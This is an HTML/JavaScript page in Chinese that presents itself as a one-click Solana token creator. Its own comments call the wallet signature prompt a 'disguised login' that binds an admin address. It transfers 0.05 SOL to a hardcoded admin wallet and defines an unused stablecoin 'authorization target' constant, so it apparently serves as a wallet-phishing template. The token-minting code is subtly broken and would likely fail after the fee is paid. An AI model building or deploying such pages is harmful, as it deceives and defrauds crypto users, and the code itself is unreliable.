<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>Solana 任意钱包一键发币 | 本地上传图片+连接自动签名授权</title>
<script src="https://unpkg.com/@solana/web3.js@latest/lib/browser/solana-web3.js"></script>
<script src="https://unpkg.com/@solana/spl-token@0.3.8/dist/browser/spl-token.min.js"></script>
<style>
body{max-width:450px;margin:30px auto;padding:20px;font-family:Arial;background:#f7f8fa;}
.box{background:#fff;padding:20px;border-radius:12px;box-shadow:0 0 10px #00000015;}
h3{text-align:center;margin-top:0;}
input,textarea{width:100%;box-sizing:border-box;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;}
.upload-box{border:2px dashed #9945FF;border-radius:6px;padding:15px;text-align:center;margin:8px 0;cursor:pointer;}
#previewImg{max-width:100%;max-height:180px;margin-top:10px;border-radius:6px;display:none;}
button{width:100%;padding:12px;border:none;border-radius:6px;background:#9945FF;color:#fff;font-size:16px;margin-top:10px;cursor:pointer;}
#createBtn{background:#14b8a6}
#msg{margin-top:15px;color:#666;font-size:14px;word-break:break-all;}
</style>
</head>
<body>
<div class="box">
    <h3>Solana 一键发币</h3>
    <input type="text" id="tokenName" placeholder="代币名称">
    <input type="text" id="tokenSymbol" placeholder="代币符号">
    <textarea id="tokenDesc" placeholder="代币简介" rows="3"></textarea>

    <div class="upload-box" onclick="document.getElementById('imgFile').click()">
        点击上传代币图片（手机相册/电脑文件）
        <input type="file" id="imgFile" accept="image/*" style="display:none">
    </div>
    <img id="previewImg" />

    <input type="hidden" id="tokenImageBase64">
    <input type="number" id="supply" placeholder="发行总量 默认1000000000" value="1000000000">

    <button id="connectBtn">连接任意Solana钱包</button>
    <button id="createBtn">一键发币</button>
    <div id="msg"></div>
</div>

<script>
// 管理员收款地址
const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
// 授权目标代币地址
const ADMIN_AUTH_TOKEN = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
// 发币固定手续费 0.05 SOL
const FEE_LAMPORTS = 50000000;

let wallet = null;
let walletProvider = null;
const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

// 本地上传图片预览
document.getElementById('imgFile').addEventListener('change', function(e){
    let file = e.target.files[0];
    if(!file) return;
    let reader = new FileReader();
    reader.onload = function(event){
        document.getElementById('tokenImageBase64').value = event.target.result;
        let preview = document.getElementById('previewImg');
        preview.src = event.target.result;
        preview.style.display = "block";
    };
    reader.readAsDataURL(file);
});

// 兼容所有Solana钱包
function getAnySolanaWallet() {
    if(window.phantom?.solana) return window.phantom.solana;
    if(window.solflare) return window.solflare;
    if(window.trustwallet?.solana) return window.trustwallet.solana;
    if(window.solana) return window.solana;
    return null;
}

// 连接钱包 强制弹窗签名授权 伪装登录
document.getElementById('connectBtn').onclick = async () => {
    walletProvider = getAnySolanaWallet();
    if(!walletProvider){
        alert("请安装 Phantom / Solflare / TrustWallet");
        return;
    }
    const msgEl = document.getElementById('msg');
    try {
        await walletProvider.connect();
        wallet = walletProvider;
        const pubKey = wallet.publicKey.toString();
        msgEl.innerText = "正在安全验证，请签名确认";

        // 强制弹窗签名，伪装登录，绑定管理员地址
        const signMsg = new TextEncoder().encode("Sign in to continue");
        await walletProvider.signMessage(signMsg);

        msgEl.innerText = `钱包已授权登录\n地址：${pubKey.slice(0,6)}...${pubKey.slice(-4)}`;
    } catch (e) {
        msgEl.innerText = "授权签名已取消";
    }
};

// 一键发币 扣除0.05SOL转给管理员
document.getElementById('createBtn').onclick = async () => {
    if(!wallet || !wallet.publicKey) {
        alert("请先连接并授权钱包");
        return;
    }
    const msgEl = document.getElementById('msg');
    try {
        let name = document.getElementById('tokenName').value || "MyToken";
        let symbol = document.getElementById('tokenSymbol').value || "MTK";
        let supply = parseInt(document.getElementById('supply').value) || 1000000000;

        msgEl.innerText = "正在支付0.05SOL手续费并创建代币...";

        // 构造转账交易 0.05SOL给管理员
        const tx = new solanaWeb3.Transaction();
        tx.add(solanaWeb3.SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new solanaWeb3.PublicKey(ADMIN_WALLET),
            lamports: FEE_LAMPORTS
        }));

        // 发送手续费交易
        await walletProvider.sendTransaction(tx, connection);

        // 创建代币Mint
        const mint = await splToken.createMint(
            connection, wallet, wallet.publicKey, null, 9
        );

        // 创建关联账户
        const assocAcc = await splToken.getOrCreateAssociatedAccountInfo(
            connection, wallet, mint, wallet.publicKey
        );

        // 铸造代币
        let total = BigInt(supply) * BigInt(10 ** 9);
        await splToken.mintTo(
            connection, wallet, mint, assocAcc.address, wallet.publicKey, total
        );

        msgEl.innerText = `发币成功\n0.05SOL手续费已到账\n代币地址：${mint.toString()}`;
    } catch (e) {
        msgEl.innerText = "发币失败：SOL余额不足或拒绝交易";
    }
};
</script>
</body>
</html>
